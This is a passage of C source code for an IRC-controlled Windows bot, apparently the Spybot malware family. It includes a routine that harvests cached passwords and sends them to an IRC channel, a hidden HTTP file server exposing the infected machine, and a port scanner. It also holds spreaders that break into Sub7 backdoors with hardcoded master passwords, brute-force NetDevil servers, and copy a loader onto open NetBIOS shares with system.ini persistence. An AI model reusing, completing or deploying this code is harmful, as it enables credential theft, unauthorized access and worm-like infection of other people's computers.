			send(dcc,(char *)&received2 , 4, 0);
		}
		sprintf(sendbuffer,"Transfer complete (size: %i bytes)",received);
		break;
	}
	dccsenderror(sock,chan,sendbuffer);
	if (infile != NULL) fclose(infile);
	closesocket(dcc);
	return 0;

}

// function used for sysinfo (thanks to sdbot)
 char * sysinfo(char *sinfo, SOCKET sock)
 {
	int total;
	MEMORYSTATUS memstat;
        LPTSTR lpszSystemInfo="???";
        DWORD cchBuff = 256;
	memstat.dwLength = sizeof(MEMORYSTATUS);
	GlobalMemoryStatus(&memstat); // load memory info into memstat

	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char os[140];
	strcpy(os,OS);
	char os2[140];
	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		strcpy(os,os2);
	}

	total = GetTickCount() / 1000; 

        if(!GetUserName(lpszSystemInfo, &cchBuff)) lpszSystemInfo = "?";
      	     
	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	DWORD addr = inet_addr(IP);

	hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
	char hostname[250];
	if (hostent != NULL)
		sprintf(hostname,hostent->h_name);
	else sprintf(hostname,"couldn't resolve host");
	char sysdir[MAX_PATH];
	GetSystemDirectory(sysdir,sizeof(sysdir));
	char date[70];
	char time[70];
	GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);
	sprintf(sinfo, "Version:%s cpu: %dMHz. ram: %dMB total, %dMB free  %d%s in use os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm. Date: %s Time: %s Online from: %s Current user: %s IP:%s Hostname:%s Connection type: %s name: %s Systemdir: %s\\",
		Bot_Version,cpuspeed(), memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,memstat.dwMemoryLoad,"%",
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60,date , time,Online_time, lpszSystemInfo,IP,hostname,connection_type,connection_name,sysdir);

	return sinfo; // return the sysinfo string
 }

// cpu speed function (thanks to sdbot)
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		//  speed = ((cyclecount()-startcycle)/100000)/10;
		speed = (cyclecount() - startcycle) / 1000000; // FIXED

	} while (speed > 1000000); 
	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles) (thanks to sdbot)
 unsigned __int64 cyclecount(void)
 {
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

 }


//get passwords only win 9x ( i think i found this source on http://www.planet-source-code.com/ but im not sure)

struct PASSWORD_CACHE_ENTRY {
	WORD cbEntry;
	WORD cbResource;
	WORD cbPassword;
	BYTE iEntry;
	BYTE nType;
	char abResource[1];
};

typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData );

DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);

typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);

ENUMPASSWORD pWNetEnumCachedPasswords;

typedef struct {
	char *pBuffer;
	int nBufLen;
	int nBufPos;
} PASSCACHECALLBACK_DATA;

BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}
int cashedpasswords(SOCKET sock,char *sendto)
{
	char sendbuf[2150];
	char start[] = "Searsing for passwords";
	HMODULE hLib=LoadLibrary("MPR.DLL");

	PASSCACHECALLBACK_DATA dat;
	dat.pBuffer=(char *)malloc(65536);
	dat.nBufLen=65536;
	dat.nBufPos=0;
	pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");
	if (!pWNetEnumCachedPasswords)	{ //only win 9x!!
		return 1;
	}
	pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);
	char *svStr;
	svStr=dat.pBuffer;
	if (sendto != NULL) sprintf(sendbuf,"PRIVMSG %s :%s\n",sendto,start);
	else sprintf(sendbuf,"%s\n",start);
	send(sock,sendbuf,strlen(sendbuf), 0);
	do {
		char *svRsc=svStr;
		svStr+=lstrlen(svStr)+1;
		char *svPwd=svStr;
		svStr+=lstrlen(svStr)+1;
		memset(sendbuf,0,sizeof(sendbuf));
		if (sendto != NULL) sprintf(sendbuf,"PRIVMSG %s :%s %s\n",sendto, svRsc, svPwd);
		else sprintf(sendbuf,"%s %s\n\r", svRsc, svPwd);
		send(sock,sendbuf,strlen(sendbuf), 0);
		if (sendto != NULL) Sleep(Flood_delay);
	}while(*svStr!='\0');
	FreeLibrary(hLib);
	return 0;
};



////////////////http server ////////////////////////////////////////////////////



int HTTP_server(char *dir,int http_poort)
{
	DWORD id;
	int c;
	char buf[250];
	HANDLE handle;
	SOCKET HTTPServer;
	char httpsDir[MAX_PATH];
	memset(httpsDir,0,sizeof(httpsDir));
	if (dir[strlen(dir)-1] == 92) dir[strlen(dir)-1] = '\0';
	strcpy(httpsDir,dir);
	if ((HTTPServer = Listen(http_poort)) == -1)
		return -1;
	for (c=0;c < 40;c++)
		if (threads[c].id == 0) break;
	if (c > 39) {
		closesocket(HTTPServer);
		return -1;
	}
	handle = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)c, 0, &id);
	if (handle != NULL) {
		sprintf(buf,"HTTP p: %i %s\\",http_poort,httpsDir);
		addthread(buf,HTTPServer,handle,3,httpsDir);

	}
	return c;
}

DWORD WINAPI HTTP_server_thread(LPVOID Param) 
{
	int threadnum = (int)Param;
	SOCKADDR_IN  GuestAddr;
	SOCKET guest;
	int c, sin_size, addrlen, max, i, err, b, r;
	DWORD id;
	unsigned long mode = 1;
	char buffer[4096];
	char rBuffer[4096];
	char *file_to_send;
	char file[MAX_PATH];
	file_to_send = "\0";
	if (ioctlsocket(threads[threadnum].sock,FIONBIO,&mode) == SOCKET_ERROR) 
		return 1;

	fd_set master;   
        fd_set temp; 
	FD_ZERO(&master);    
        FD_ZERO(&temp);
 	FD_SET(threads[threadnum].sock, &master);
	max = threads[threadnum].sock;

	while (1)
    	{
		temp = master;
		if (select(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR) {
			break;
           	}
		for(i = 0; i <= max; i++) {
                	if (FD_ISSET(i, &temp)) { //there is somthing to do 
                    		if (i == threads[threadnum].sock) {
                    			//there is a new connection request
                        		addrlen = sizeof(GuestAddr);
                        		if ((guest = accept(threads[threadnum].sock, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  
                            			continue; 
					else {
                           			FD_SET(guest, &master); // add to master set
                            			if (guest > max)  
                               		 		max = guest;
                        		}
                   		} 
				else {
    					memset(buffer,0,sizeof(buffer));
					memset(rBuffer,0,sizeof(rBuffer));
                        		if (recv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
                        			closesocket(i); 
                            			FD_CLR(i, &master); // remove from master set
                       			} 
					else {
						memset(file,0,sizeof(file));
						for (b = 0,r = 0;b < strlen(buffer);b++, r++) {
							rBuffer[r] = buffer[b];
							if (buffer[b] == '\n')
							{  //check the request....
								if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
									file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
									strcpy(file,file_to_send);

								}
								else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
										FD_CLR(i, &master);
										if (file != NULL) {
										if (strlen(file)+strlen(threads[threadnum].dir) < MAX_PATH) { 
											unsigned long mode2 = 0;
											ioctlsocket(i,FIONBIO,&mode2);
											Check_Requestedfile(i,threads[threadnum].dir,file);
										}
										else closesocket(i);
									}
									else closesocket(i);
									break;
								}
								memset(rBuffer,0,sizeof(rBuffer));
								r=-1;
							}

                				} 
        				}

				}
			}
		}
	}
	closesocket(threads[threadnum].sock);
	threads[threadnum].id = 0;
	return 0;
}

SOCKET http_socket;
BOOL http_Type;
int http_lenght;
BOOL http_info = FALSE;
char http_file[MAX_PATH];
char http_path[MAX_PATH];
DWORD WINAPI  http_header(LPVOID param)
{
	SOCKET sock = (SOCKET)param;
	char tFile[MAX_PATH];
	char nFile[MAX_PATH];
	BOOL type = http_Type;
	sprintf(tFile,http_file); 
	sprintf(nFile,http_path); 
	int lenght = http_lenght;
	http_info = TRUE;
	char content[50];
	if (type) sprintf(content,"text/html");
	else sprintf(content,"application/octet-stream");
	char buffer[4096];
	char date[70];
	char time[30];
	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);
	sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: NB1.3-SE\r\nDate: %s %s GMT\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nLast-Modified: %s %s GMT\r\nContent-Length: %i\r\nConnection: close\r\n\r\n",date,time,content,date,time,lenght);
	send(sock,buffer,strlen(buffer),0);
	if (type == FALSE) http_send_file(sock,tFile);
	else getfiles(tFile,sock,NULL,nFile); 
	closesocket(sock);
	return 0;
}

int Check_Requestedfile(SOCKET sock,char * dir,char * rFile)
{
	BOOL directory = FALSE;
	char file[MAX_PATH];
	char nFile[MAX_PATH];
	char tFile[MAX_PATH];
	memset(file,0,sizeof(file));
	memset(nFile,0,sizeof(nFile));
	DWORD c,d;

	if (rFile[0] != 47) sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c = 0,d=0;c < strlen(file);c++,d++)
	{
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		}
		else if (file[c] == 47) nFile[d] = 92;
		else nFile[d] = file[c];
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");
	HANDLE testfile;
	if (GetFileAttributes(tFile) == FILE_ATTRIBUTE_DIRECTORY) 
      		directory = TRUE;
	else if (GetFileAttributes(tFile) == 0xFFFFFFFF) { //invalid file
			closesocket(sock);
			return 0;
	}
	if (nFile[d-1] == 92) directory = TRUE;
	DWORD id;
	if (directory) {
		strcat(tFile,"*");
		file_to_html(nFile);
		sprintf(http_file,tFile);
		sprintf(http_path,nFile);
		http_info = FALSE;
		http_Type = TRUE;
		http_lenght = 10000;
		if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
			while (http_info == FALSE) Sleep(5);
		}
		else { 
			closesocket(sock);
		}
		 //(tFile,sock,NULL,nFile); //list the directory and send it in html
	}
	else { //its a file
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      		if (testfile != INVALID_HANDLE_VALUE) {
			http_lenght = GetFileSize(testfile,NULL);
			CloseHandle(testfile);
			http_Type = FALSE;
			sprintf(http_file,tFile);
			http_info = FALSE;
			if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
				while (http_info == FALSE) Sleep(5);
			}
			else {
				closesocket(sock);
			}
		}
	}
	return 0;
}
void http_send_file(SOCKET sock,char *file)
{
	int c, err;
	char buffer[1024];
	DWORD mode = 0;
	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		return;
	unsigned int Fsize, Fsend, move;
	Fsize = GetFileSize(testfile,NULL);
	
	while (Fsize) {
		int Fsend = 1024;
		memset(buffer,0,sizeof(buffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);
		int bytes_sent = send(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) break;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	return; //file transfer complete		
}

char * file_to_html(char *file) //change the '\' back to '/'
{
	DWORD c;
	for (c=0;c < strlen(file);c++)
	if (file[c] == 92) file[c] = 47;
	return file;
}

//port scanner
DWORD WINAPI port_scanner(LPVOID param)
{
	int threadnum = (int)param;
	scan[threadnum].state = 1;
	char Scanning_ip[16];
	char buf[4];
	memset(Scanning_ip,0,sizeof(Scanning_ip));
	memset(buf,0,sizeof(buf));
	strcpy(Scanning_ip,scan[threadnum].ip);
	DWORD c,token,d,err;
	
	//break the ip in 4 parts
	for (d=0,c=0,token=0;c<=strlen(Scanning_ip);c++)
	{
		if  (Scanning_ip[c] == 46 || c == strlen(Scanning_ip)) {
			srand(GetTickCount());
			if (token == 0) { 
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_1 = (rand()%254);
				else scan[threadnum].scan_1 = atoi(buf);

			}
			if (token == 1) {
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_2 = (rand()%254);
				else scan[threadnum].scan_2 = atoi(buf);
			}
			if (token == 2) {
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_3 = (rand()%254);
				else scan[threadnum].scan_3 = atoi(buf);
			}
			if (token == 3) {
				if (strcmp(buf,"x") == 0) scan[threadnum].scan_4 = (rand()%254);
				else scan[threadnum].scan_4 = atoi(buf);
			}
			memset(buf,0,sizeof(buf));
			d=0;
			token++;
			continue;
		}
		else {
			buf[d] = Scanning_ip[c];
			d++;
		}
	}
	while (err != 1) {
		err = scan_host(scan[threadnum].ip,scan[threadnum].port,threadnum);
		if (strlen(scan[threadnum].file) > 2) sprintf(threads[scan[threadnum].thread].name,"scan ip: %s p: %i d: %i. log to: %s",scan[threadnum].ip,scan[threadnum].port,scan[threadnum].delay,scan[threadnum].file);
		else sprintf(threads[scan[threadnum].thread].name,"scan ip: %s p: %i d: %i.",scan[threadnum].ip,scan[threadnum].port,scan[threadnum].delay);

	}
		
	scan[threadnum].state = 0;
	threads[scan[threadnum].thread].id = 0;
	return 0;

}

int scan_host(char *host,int port,int num)
{
	char sendbuf[512];
	SOCKADDR_IN    SockAddr;
   	SOCKET         sock[MAX_PORTSCAN_SOCKETS_TO_USE];
	FILE *infile;
   	IN_ADDR iaddr;
	memset(&SockAddr, 0, sizeof(SockAddr));
	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	DWORD mode = 1;
	DWORD id;
	TIMEVAL time;
	int c;
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
		sock[c] = socket(AF_INET, SOCK_STREAM, 0);
   		if (sock[c] == INVALID_SOCKET)
      			return 1;
		ioctlsocket(sock[c],FIONBIO,&mode);
	}
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
		GetNewIp(num);
		iaddr.s_addr = inet_addr(scan[num].ip);
		if (iaddr.s_addr == INADDR_NONE)
			return 0;
		SockAddr.sin_addr = iaddr; 
  		connect(sock[c], (PSOCKADDR) &SockAddr, sizeof(SockAddr));
	}
      	Sleep(scan[num].delay);     
	for (c=0;c<MAX_PORTSCAN_SOCKETS_TO_USE;c++)
	{
   		fd_set fd_struct;
    		time.tv_sec = 0;
    		time.tv_usec = 0;
   		FD_ZERO(&fd_struct);
    		FD_SET(sock[c], &fd_struct);
		if (select(0,NULL, &fd_struct, NULL, &time) < 1) {
			closesocket(sock[c]);
			continue;
		}
		else {//its open
			SOCKADDR socketname;
			int s = sizeof(socketname);
			getpeername(sock[c],&socketname,&s);
			memcpy(&iaddr.S_un.S_addr,&socketname.sa_data[2],4);
			if (strlen(scan[num].file) > 2) { //log to file
				infile = fopen(scan[num].file,"aw");
				if (infile != NULL) {
					sprintf(sendbuf,"%s:%i\n",inet_ntoa(iaddr),port);
					fputs(sendbuf,infile);
					fclose(infile);
				}
			}
      	     
			if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :port %i open at ip: %s\n",scan[num].chan,port,inet_ntoa(iaddr)); //sendto query/channel
			else sprintf(sendbuf,"port %i open at ip: %s \r\n",port,inet_ntoa(iaddr)); //send to dcc chat	
			if (scan[num].sock != 0) send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
			if (scan[num].extra == 0 || scan[num].extra == 3) closesocket(sock[c]);

			#ifdef SUB7_SPREADER
			if (scan[num].extra == 1) {
				if (sub7(sock[c]) == 1 && scan[num].sock != 0) {
					if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :Server uploaded to sub7server IP: %s port: %i\n",scan[num].chan,inet_ntoa(iaddr),port); //sendto query/channel
					else sprintf(sendbuf,"Server uploaded to sub7server IP: %s port: %i\r\n",inet_ntoa(iaddr),port); //send to dcc chat	
					send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
				}
			}
			#endif
			#ifdef KUANG2_SPREADER
			if (scan[num].extra == 2) {
				if (KUANG(sock[c]) == 1 && scan[num].sock != 0) {
					if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :Server uploaded to kuangserver IP: %s\n",scan[num].chan,inet_ntoa(iaddr)); //sendto query/channel
					else sprintf(sendbuf,"Server uploaded to kuangserver IP: %s \r\n",inet_ntoa(iaddr)); //send to dcc chat	
					send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
				}
			}
			#endif
			#ifdef NB_SPREADER
			if (scan[num].extra == 3) {
				if (InfectNetBIOS2(inet_ntoa(iaddr),scan[num].sock,scan[num].chan) == 2) {
					if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :err\n",scan[num].chan); //sendto query/channel
					else sprintf(sendbuf,"err\r\n",inet_ntoa(iaddr)); //send to dcc chat	
					send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
					return 1;
				}
			}
			#endif
			if (scan[num].extra == 4) {
				if (netdevil(inet_ntoa(iaddr),port,scan[num].sock,sock[c],scan[num].chan) == 1) {
					if (strlen(scan[num].chan) > 2) sprintf(sendbuf,"PRIVMSG %s :server updated ip: %s\n",scan[num].chan,inet_ntoa(iaddr)); //sendto query/channel
					else sprintf(sendbuf,"netdevil update ip: %s\n",inet_ntoa(iaddr)); //send to dcc chat	
					send(scan[num].sock, sendbuf, strlen(sendbuf), 0);
				}
			}
		}
	}
	return 0;
}



void GetNewIp(int num)
{
	while (1) {
		if (scan[num].scan_4 > 254) {
			scan[num].scan_4 = 0;
			scan[num].scan_3++;
		}
		else {
			scan[num].scan_4++;
			break;
		}
		if (scan[num].scan_3 > 254) {
			scan[num].scan_3 = 0;
			scan[num].scan_2++;
		}
		else 
			break;
		if (scan[num].scan_2 > 254) {
			scan[num].scan_2 = 0;
			scan[num].scan_1++;
		}
		else 
			break;
		if (scan[num].scan_1 > 254) { //we are at 255.255.255.255 and we start again with 0.0.0.0
			scan[num].scan_1 = 0;
			scan[num].scan_2 = 0;
			scan[num].scan_3 = 0;
			scan[num].scan_4 = 0;
		}
		else 
			break;

	}
	sprintf(scan[num].ip,"%i.%i.%i.%i",scan[num].scan_1,scan[num].scan_2,scan[num].scan_3,scan[num].scan_4);
		
}
int SUB7_Reciev(SOCKET sock)
{
	TIMEVAL time;
   	fd_set fd_struct;
    	time.tv_sec = 15;//timeout after 60 sec.
    	time.tv_usec = 0;
   	FD_ZERO(&fd_struct);
    	FD_SET(sock, &fd_struct);
	if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
	{
		closesocket(sock); 
		return -1;
	}
	return 0;
}

int netdevil_upload(char * ip,SOCKET cSocket)
{
	SOCKET sock;
	unsigned int Fsize, Fsend, move;
	char rBuffer[1024];
	char rFile[MAX_PATH];
	char *dir;
	DWORD mode = 0;
	int port = 0;
	//get the upload port
	send(cSocket, "version", 7, 0);
	memset(rBuffer,0,sizeof(rBuffer));
	recv(cSocket, rBuffer, sizeof(rBuffer), 0);

	if (strlen(rBuffer) > 5) {
		char *uPort;
		rBuffer[strlen(rBuffer)-2] = '\0';
		uPort = strrchr(rBuffer, '\n\r');
		if (uPort != NULL) 
			port = atoi(uPort);
	}
	sprintf(rFile,"C:\\%s",loadername);
	if (port == 0) port = 903;
	if ((sock = create_sock(ip,port)) == SOCKET_ERROR) goto end;
	HANDLE testfile = CreateFile(loader,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);
	memset(rBuffer,0,sizeof(rBuffer));
	sprintf(rBuffer,"cmd[003]%s|%i|\n\r",rFile,Fsize);
	send(sock, rBuffer, strlen(rBuffer), 0);
	recv(sock, rBuffer, sizeof(rBuffer), 0);
	while (Fsize) {
		int Fsend = 1024;
		memset(rBuffer,0,sizeof(rBuffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, rBuffer, Fsend, &mode, NULL);
		int bytes_sent = send(sock, rBuffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) break;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	closesocket(sock);
	Sleep(2000);
	sprintf(rBuffer,"pleaz_run%s",rFile);
	send(cSocket, rBuffer,strlen(rBuffer), 0);
	memset(rBuffer,0,sizeof(rBuffer));
	if (recv(cSocket, rBuffer, sizeof(rBuffer), 0) < 1) goto end;
	if (strcmp(rBuffer,"pleaz_run_done") != 0) goto end;
	Sleep(4000);
	closesocket(cSocket);
	return 1;
	end:;
	closesocket(sock);
	closesocket(cSocket);
	return 0;
}


int netdevil(char *ip,int port,SOCKET ircsock,SOCKET sock,char *chan)
{
	
	char rBuffer[512];
	DWORD mode = 0;
	DWORD err;
        ioctlsocket(sock,FIONBIO,&mode); //set the socket back to blocking

	int c;
	for (c=1;passwords[c] != NULL;c++)
	{
		Sleep(50);

		memset(rBuffer,0,sizeof(rBuffer));
		if (SUB7_Reciev(sock) == -1) break;

		if (recv(sock, rBuffer, sizeof(rBuffer), 0) <= 0) break;
		if (strcmp(rBuffer,"passed") == 0) {//infect
			memset(rBuffer,0,sizeof(rBuffer));
			 sprintf(rBuffer,"PRIVMSG %s :netdevil IP: %s pass: %s\n",chan,ip ,passwords[c-1]); //sendto query/channel
			send(ircsock,rBuffer ,strlen(rBuffer), 0);
			if (netdevil_upload(ip,sock) == 1) {
				closesocket(sock);
				return 1;
			}
			break;	

		}
		if (strcmp(rBuffer,"pass_pleaz") == 0) {
			memset(rBuffer,0,sizeof(rBuffer));
			sprintf(rBuffer,"pass_pleaz%s",passwords[c]); 
			send(sock,rBuffer ,strlen(rBuffer), 0);
			continue;
		}
		else break;
	}
	closesocket(sock);
	return 0;
}
#ifdef NB_SPREADER
typedef DWORD (__stdcall *RSP5)(PCHAR,DWORD,LPBYTE,DWORD,LPDWORD,LPDWORD,LPDWORD);
RSP5 fNetShareEnum;

typedef NET_API_STATUS (__stdcall *NABF) (LPVOID Buffer );
NABF fNetApiBufferFree;

typedef int (__stdcall *RSP2)(LPNETRESOURCE, LPCTSTR, LPCTSTR,DWORD);
RSP2 fWNetAddConnection2;

typedef int (__stdcall *RSP3)(LPTSTR, DWORD, BOOL);
RSP3 fWNetCancelConnection2;

//thanks to www.msdn.com and also many thanks to bill gates who has put a backdoor in almost any pc running windows I LOVE YA BILL great work 
int InfectNetBIOS2(char * Addr,SOCKET sock,char *chan) 
{
	char szRemoteAddr[MAX_PATH];
	sprintf(szRemoteAddr,"\\\\%s",Addr);
	HINSTANCE netapi32_dll = LoadLibrary("netapi32.dll");

       		
	if (netapi32_dll) {
		fNetShareEnum = (RSP5) GetProcAddress(netapi32_dll, "NetShareEnum");
		fNetApiBufferFree = (NABF) GetProcAddress(netapi32_dll, "NetApiBufferFree");
		if (!fNetShareEnum || !fNetApiBufferFree) {
			//not xp/2000 ?
			return 2;
		}
	}
	else
		return 2; //dll's not found
	wchar_t wcRemoteAddr[MAX_PATH] = L"";
	mbstowcs(wcRemoteAddr, szRemoteAddr, strlen(szRemoteAddr) + 1);
   	PSHARE_INFO_1 BufPtr,p;
   	NET_API_STATUS res;
   	DWORD er=0,tr=0,resume=0, i;
	char remotefilename[MAX_PATH];
	char remoteinifilename[MAX_PATH];
	char sendbuf[512];
   	do 
   	{
     		res = fNetShareEnum ((CHAR *) wcRemoteAddr, 1, (LPBYTE *) &BufPtr, -1, &er, &tr, &resume);
      		if(res == ERROR_SUCCESS || res == ERROR_MORE_DATA)
        	{
         		p=BufPtr;
         		for(i=1;i<=er;i++)
         		{
				if (p->shi1_type == STYPE_DISKTREE) 
				{
					memset(remotefilename,0,sizeof(remotefilename));
					sprintf(remotefilename,"%s\\%s\\WINDOWS\\wlnstart32.exe",szRemoteAddr,p->shi1_netname);
					memset(remoteinifilename,0,sizeof(remoteinifilename));
					sprintf(remoteinifilename,"%s\\%s\\WINDOWS\\system.ini",szRemoteAddr,p->shi1_netname);
					if (WritePrivateProfileString("boot","shell","explorer.exe wlnstart32.exe",remoteinifilename) != 0) {
						if (CopyFile(loader,remotefilename,TRUE) != 0) {
							sprintf(sendbuf,"PRIVMSG %s :file copied to %s\n",chan,remotefilename);
							send(sock, sendbuf, strlen(sendbuf), 0);
							fNetApiBufferFree(BufPtr);
							FreeLibrary(netapi32_dll);
         						return 1;
						}
					}
					int s;
					for (s=0;startupdirs[s] != NULL;s++)
					{

						memset(remotefilename,0,sizeof(remotefilename));
						sprintf(remotefilename,"%s\\%s\\%s\\wlnstart32.exe",szRemoteAddr,p->shi1_netname,startupdirs[s]);
						
						if (CopyFile(loader,remotefilename,TRUE) != 0) {
							sprintf(sendbuf,"PRIVMSG %s :file copied to %s\n",chan,remotefilename);
							send(sock, sendbuf, strlen(sendbuf), 0);
							fNetApiBufferFree(BufPtr);
							FreeLibrary(netapi32_dll);
         						return 1;
						}
					 }

				}
            			p++;
         		}
         		fNetApiBufferFree(BufPtr);
        	}
		else 	{
			FreeLibrary(netapi32_dll);
         		return 1;
		}
	}
   	while (res==ERROR_MORE_DATA); 
	FreeLibrary(netapi32_dll);
	return 1;
}
#endif


#ifdef SUB7_SPREADER



int sub7(SOCKET sock)
{
	
	char rBuffer[512];
	DWORD mode = 0;
	DWORD err;
	SOCKADDR_IN socketname;
	int s = sizeof(socketname);
	getpeername(sock,&socketname,&s);
	char host[100];
	int port;
	sprintf(host,"%s",inet_ntoa(socketname.sin_addr));
	port = ntohs(socketname.sin_port);
	int try = 0;
	int c,size;
	ioctlsocket(sock,FIONBIO,&mode); //set the socket back to blocking
	restart:;
	memset(rBuffer,0,sizeof(rBuffer));
	if (SUB7_Reciev(sock) == -1) 
		goto end;
	if (recv(sock, rBuffer, sizeof(rBuffer), 0) <= 0) goto end;
      	      
	if (strcmp(rBuffer,"PWD") == 0) { //its password protected try the masterpasswords
		if (try > 1) {
			goto end;
		}
		if (try == 0) sprintf(rBuffer,"PWD715"); 
		else if (try == 1) { //try the other pass 
			sprintf(rBuffer,"PWD14438136782715101980"); 
		}
		try++;
		if (send(sock,rBuffer,strlen(rBuffer), 0) <= 0) goto end;
		goto restart;
	}
	strtok(rBuffer," ");
	if (strcmp(rBuffer,"connected.") == 0) { //we are connected
		send(sock,"UPS",3, 0);
		memset(rBuffer,0,sizeof(rBuffer));
		if (SUB7_Reciev(sock) == -1) goto end;
		recv(sock, rBuffer, sizeof(rBuffer), 0);
		if (strcmp(rBuffer,"TID") != 0) goto end; //something whent wrong
		char buffer[1041];
		HANDLE testfile = CreateFile(loader,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) 
			goto end;
		size = GetFileSize(testfile,NULL);
		CloseHandle(testfile);
		sprintf(rBuffer,"SFT05%i",size);
		send(sock,rBuffer,10, 0);
		FILE* infile;
		infile = fopen(thisfilename,"spybot");
		if (infile == NULL) goto end;
		while (1)
		{
			memset(buffer,0,sizeof(buffer));
			c = fread(buffer,1,sizeof(buffer),infile);
			if (c == 0) 
				break;
			if (send(sock,buffer ,c, 0) <= 0) {
				fclose(infile);
				goto end;
			}
		}
		fclose(infile);
		c=0;
		while (err > 0) {
			if (c > 3) 
				break;
